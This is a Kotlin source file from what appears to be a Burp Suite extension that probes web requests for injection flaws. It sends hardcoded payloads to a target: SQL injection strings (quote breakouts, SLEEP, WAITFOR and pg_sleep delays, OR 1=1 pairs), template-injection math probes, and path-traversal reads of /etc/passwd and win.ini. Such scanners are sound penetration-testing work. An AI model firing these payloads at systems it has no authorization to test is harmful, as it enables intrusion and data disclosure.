package io.bitbytelab.raijin.bridge

import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.HttpService
import burp.api.montoya.http.message.requests.HttpRequest
import io.bitbytelab.raijin.core.TextSimilarity
import io.bitbytelab.raijin.injection.InjectionOracle
import io.bitbytelab.raijin.safety.BoundedHttp
import io.bitbytelab.raijin.safety.RequestHygiene
import io.bitbytelab.raijin.safety.ScopeGate
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

/**
 * Guided injection probe with confirmation oracles — turns raw fuzzing into
 * confirmed findings. Mark the injection point with the FUZZ keyword; for each
 * vuln class it injects class-specific payloads and confirms via
 * [InjectionOracle] (SQL error fingerprints, SSTI math-evaluation, file markers,
 * time-delay, boolean-differential). Scope-gated. Blind/OOB classes (SSRF, blind cmdi)
 * are out of scope here — pair collaborator_* with http_fuzz for those.
 */
class InjectionBridge(private val api: MontoyaApi) {

    private val scopeGate = ScopeGate(api)

    private data class Probe(val body: String, val status: Int, val elapsedMs: Long)

    private fun send(service: HttpService, raw: String): Probe = try {
        val start = System.nanoTime()
        val result = BoundedHttp.send(api, HttpRequest.httpRequest(service, RequestHygiene.normalizeCrlf(raw)))
        val ms = (System.nanoTime() - start) / 1_000_000
        val resp = result?.response()
        Probe(resp?.bodyToString() ?: "", resp?.statusCode()?.toInt() ?: 0, ms)
    } catch (_: Exception) {
        Probe("", 0, 0)
    }

    private fun finding(cls: String, technique: String, detail: String, payload: String): JsonObject = buildJsonObject {
        put("class", cls)
        put("technique", technique)
        put("severity", "high")
        put("detail", detail)
        put("payload", payload)
    }

    /**
     * @param delaySeconds Sleep duration for time-based SQLi payloads (default 5). Raise this
     *   for a target with network jitter, a lab that only counts a longer sleep as solved, or
     *   a WAF that clamps/rate-limits short sleeps.
     */
    fun probe(request: String, host: String, port: Int, useTls: Boolean, classes: List<String>?, delaySeconds: Int = 5): JsonObject {
        scopeGate.deny((if (useTls) "https" else "http") + "://$host:$port/")?.let { return it }
        return try {
            val service = HttpService.httpService(host, port, useTls)
            val base = RequestHygiene.normalizeCrlf(request)
            if (!base.contains("FUZZ")) {
                return buildJsonObject { put("error", "Mark the injection point with the FUZZ keyword in the request string.") }
            }

            val active = classes?.map { it.lowercase() }?.takeIf { it.isNotEmpty() } ?: listOf("sqli", "ssti", "lfi")
            val baseline = send(service, preparePayloadRequest(base, "1"))
            var probesSent = 1
            val findings = mutableListOf<JsonObject>()

            for (cls in active) {
                when (cls) {
                    "sqli" -> {
                        for (p in listOf("'", "\"", "')", "1'\"")) {
                            val r = send(service, preparePayloadRequest(base, p)); probesSent++
                            if (r.status <= 0) continue
                            val dbms = InjectionOracle.sqlError(r.body)
                            if (dbms != null && InjectionOracle.sqlError(baseline.body) == null) {
                                findings.add(finding("sqli", "error-based", "SQL error signature (DBMS=$dbms) via payload $p", p))
                                break
                            }
                        }

                        if (baseline.status > 0) {
                            // Comment-truncation, concatenation-breakout, and unquoted numeric shapes.
                            val timingPayloads = listOf(
                                "' AND SLEEP($delaySeconds)-- -", "1) AND SLEEP($delaySeconds)-- -",
                                " AND SLEEP($delaySeconds)", " OR SLEEP($delaySeconds)-- -",
                                "';WAITFOR DELAY '0:0:$delaySeconds'-- -", ";WAITFOR DELAY '0:0:$delaySeconds'-- -",
                                "' AND pg_sleep($delaySeconds)-- -", " AND pg_sleep($delaySeconds)",
                                "x'||pg_sleep($delaySeconds)||'", "'||pg_sleep($delaySeconds)||'",
                                "x' AND SLEEP($delaySeconds) AND 'x'='x", "x';WAITFOR DELAY '0:0:$delaySeconds'--",
                                "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',$delaySeconds) ELSE 1 END FROM dual)||'"
                            )
                            val thresholdMs = (delaySeconds * 1000L * 0.7).toLong()
                            for (p in timingPayloads) {
                                val r = send(service, preparePayloadRequest(base, p)); probesSent++
                                if (InjectionOracle.timeDelayed(baseline.status, baseline.elapsedMs, r.status, r.elapsedMs, delaySeconds)) {
                                    // Re-verify against a fresh fast baseline control to rule out transient network jitter.
                                    val ctrl = send(service, preparePayloadRequest(base, "1")); probesSent++
                                    if (ctrl.status > 0 && ctrl.elapsedMs < thresholdMs * 0.7) {
                                        val confirm = send(service, preparePayloadRequest(base, p)); probesSent++
                                        if (InjectionOracle.timeDelayed(ctrl.status, ctrl.elapsedMs, confirm.status, confirm.elapsedMs, delaySeconds)) {
                                            findings.add(finding(
                                                "sqli", "time-based",
                                                "response delayed ~${delaySeconds}s twice via $p (baseline ${ctrl.elapsedMs}ms, probe1 ${r.elapsedMs}ms, probe2 ${confirm.elapsedMs}ms)",
                                                p
                                            ))
                                            break
                                        }
                                    }
                                }
                            }

                            val boolPairs = listOf(
                                "' AND '1'='1" to "' AND '1'='2",
                                "' OR '1'='1" to "' OR '1'='2",
                                "x' AND '1'='1" to "x' AND '1'='2",
                                "'||('1'='1')||'" to "'||('1'='2')||'",
                                " AND 1=1" to " AND 1=2",
                                " OR 1=1" to " OR 1=2"
                            )
                            for ((truePayload, falsePayload) in boolPairs) {
                                val trueR = send(service, preparePayloadRequest(base, truePayload)); probesSent++
                                if (trueR.status <= 0) continue
                                val falseR = send(service, preparePayloadRequest(base, falsePayload)); probesSent++
                                if (falseR.status <= 0) continue
                                if (InjectionOracle.booleanDifferential(baseline.body, trueR.body, falseR.body, TextSimilarity::dice)) {
                                    findings.add(
                                        finding(
                                            "sqli", "boolean-differential",
                                            "response diverges between TRUE ($truePayload) and FALSE ($falsePayload) conditions " +
                                                "— one matches the baseline, the other does not",
                                            "$truePayload | $falsePayload"
                                        )
                                    )
                                    break
                                }
                            }
                        }
                    }
                    "ssti" -> {
                        for (p in listOf("{{1337*1337}}", "\${1337*1337}", "<%= 1337*1337 %>", "#{1337*1337}", "\${{1337*1337}}")) {
                            val r = send(service, preparePayloadRequest(base, p)); probesSent++
                            if (r.status <= 0) continue
                            if (InjectionOracle.evaluatedTo(r.body, "1787569") && !InjectionOracle.evaluatedTo(baseline.body, "1787569")) {
                                findings.add(finding("ssti", "math-eval", "template evaluated 1337*1337=1787569 via $p", p)); break
                            }
                        }
                    }
                    "lfi", "traversal" -> {
                        for (p in listOf("../../../../etc/passwd", "/etc/passwd", "....//....//....//etc/passwd", "..\\..\\..\\..\\windows\\win.ini")) {
                            val r = send(service, preparePayloadRequest(base, p)); probesSent++
                            if (r.status <= 0) continue
                            val marker = InjectionOracle.novelFileMarker(baseline.body, r.body)
                            if (marker != null) { findings.add(finding("lfi", marker, "file contents disclosed ($marker) via $p", p)); break }
                        }
                    }
                }
            }

            buildJsonObject {
                put("target", "${if (useTls) "https" else "http"}://$host:$port")
                put("classes_tested", buildJsonArray { active.forEach { add(it) } })
                put("delay_seconds", delaySeconds)
                put("probes_sent", probesSent)
                put("confirmed_count", findings.size)
                put("findings", buildJsonArray { findings.forEach { add(it) } })
                put(
                    "note",
                    "Confirmed via deterministic oracles (SQL errors, template math-eval, file markers, time delay, " +
                        "boolean-differential). FUZZ works anywhere in the raw request, including inside a header line " +
                        "such as 'Cookie: TrackingId=FUZZ'. For blind/OOB (SSRF, blind cmdi) pair collaborator_* with http_fuzz."
                )
            }
        } catch (e: Exception) {
            buildJsonObject { put("error", "Injection probe failed: ${e.message}") }
        }
    }

    companion object {
        /**
         * Substitutes [payload] into [normalizedRequest] at `FUZZ` with context-appropriate
         * escaping (request-line breaks/spaces/delimiters vs JSON string literal) and updates
         * `Content-Length` if present. Pure helper for unit testing.
         */
        internal fun preparePayloadRequest(normalizedRequest: String, payload: String): String {
            val firstLineEnd = normalizedRequest.indexOf("\r\n")
            val headerEnd = normalizedRequest.indexOf("\r\n\r\n")
            val reqLineFuzz = firstLineEnd > 0 && normalizedRequest.substring(0, firstLineEnd).contains("FUZZ")
            val bodyStart = if (headerEnd >= 0) headerEnd + 4 else -1
            val isJson = headerEnd >= 0 &&
                normalizedRequest.substring(0, headerEnd).contains("application/json", ignoreCase = true)

            val encoded = when {
                reqLineFuzz -> encodeRequestLinePayload(payload)
                isJson && bodyStart >= 0 && isInsideJsonString(normalizedRequest, bodyStart) ->
                    escapeJsonStringContent(payload)
                else -> payload
            }
            val replaced = normalizedRequest.replace("FUZZ", encoded)
            return RequestHygiene.fixContentLength(replaced, utf8Body = true).request
        }

        private fun encodeRequestLinePayload(payload: String): String = buildString(payload.length) {
            for (ch in payload) {
                when (ch) {
                    ' ' -> append("%20")
                    '&' -> append("%26")
                    '#' -> append("%23")
                    '+' -> append("%2B")
                    '\r' -> append("%0D")
                    '\n' -> append("%0A")
                    else -> append(ch)
                }
            }
        }

        private fun isInsideJsonString(request: String, bodyStart: Int): Boolean {
            val fuzzIdx = request.indexOf("FUZZ", startIndex = bodyStart)
            if (fuzzIdx < 0) return false
            val before = request.substring(bodyStart, fuzzIdx)
            var inQuotes = false
            var escaped = false
            for (ch in before) {
                if (escaped) {
                    escaped = false
                } else if (ch == '\\') {
                    escaped = true
                } else if (ch == '"') {
                    inQuotes = !inQuotes
                }
            }
            return inQuotes
        }

        private fun escapeJsonStringContent(payload: String): String = buildString(payload.length) {
            for (ch in payload) {
                when (ch) {
                    '\\' -> append("\\\\")
                    '"' -> append("\\\"")
                    '\n' -> append("\\n")
                    '\r' -> append("\\r")
                    '\t' -> append("\\t")
                    else -> append(ch)
                }
            }
        }
    }
}
